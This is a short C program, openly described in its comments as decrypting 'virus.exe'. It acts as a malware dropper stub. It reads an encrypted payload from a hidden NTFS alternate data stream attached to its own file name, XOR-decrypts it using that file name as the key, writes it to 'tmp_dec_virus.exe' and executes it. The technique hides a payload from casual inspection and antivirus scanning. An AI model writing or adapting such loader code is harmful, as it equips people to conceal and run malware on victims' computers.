
/*  Aim: decrypt virus.exe.
 *
 *  decrypted *.exe:virus.exe with key=oldprogram-name
 *
 */
#define MAX_SIZE 200


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <process.h>

int verbose = 1;
char enc_text[MAX_SIZE];
char virus_name[MAX_SIZE];
char key[MAX_SIZE];

FILE* pFile_enc_virus=NULL,*pFile_dec_virus=NULL;
int file_size=0;

void encrypt(char text[MAX_SIZE], char key[MAX_SIZE]);


int main(int argc,char* argv[]){
 
 
	//read encrypted virus exe
	char program_name[MAX_SIZE];
	char* pch;
	pch = strtok(argv[0],"/\\");
	while(pch != NULL){
    strcpy(key,pch);
    pch = strtok(NULL, "/\\");
    }

	sprintf(virus_name,"%s:virus.exe",key);
    printf("------------------------\n");
    printf("key name  :  %s\n",key);	
	printf("virus name:  %s\n",virus_name);
	printf("start ./tmp_dec_virus.exe %s\n",key);
	system("pause");

	
	
	
	pFile_enc_virus = fopen(virus_name,"rb");
	if(!pFile_enc_virus){
		printf("error open file");
		return -1;
	}
	
	pFile_dec_virus = fopen("tmp_dec_virus.exe","wb");
	if(!pFile_dec_virus){
		printf("error open file");
		return -1;
	}
	
	fseek(pFile_enc_virus,0,SEEK_END);
	file_size = ftell(pFile_enc_virus);
	fseek(pFile_enc_virus,0,SEEK_SET);
	
	//decrypt virus.
	unsigned char what;
	for(int i=0;i<file_size;i++){
        what = fgetc(pFile_enc_virus);
		what = what ^ key[i%strlen(key)];
		fwrite(&what,1,sizeof(what),pFile_dec_virus);
    }
	
	
	fclose(pFile_dec_virus);
	fclose(pFile_enc_virus);
	
	char command[MAX_SIZE];
	
	sprintf(command,"start ./tmp_dec_virus.exe %s",key);
	
	
	//sprintf(command,"start ./virus.exe %s",key);
	system(command);
	
	
	
	
return 0;
}

void encrypt(char text[MAX_SIZE], char key[MAX_SIZE]){
   int key_len = strlen(key);
   int text_len = strlen(text);
   int i=0;
   for (i=0; i<text_len;i++){
       enc_text[i] = text[i] ^ key[i%key_len];
   }


   if(verbose==1){
       printf("text      :%s\n",text);
       printf("key       :%s\n",key);
       printf("encrypted :%s\n",enc_text);
   }

}
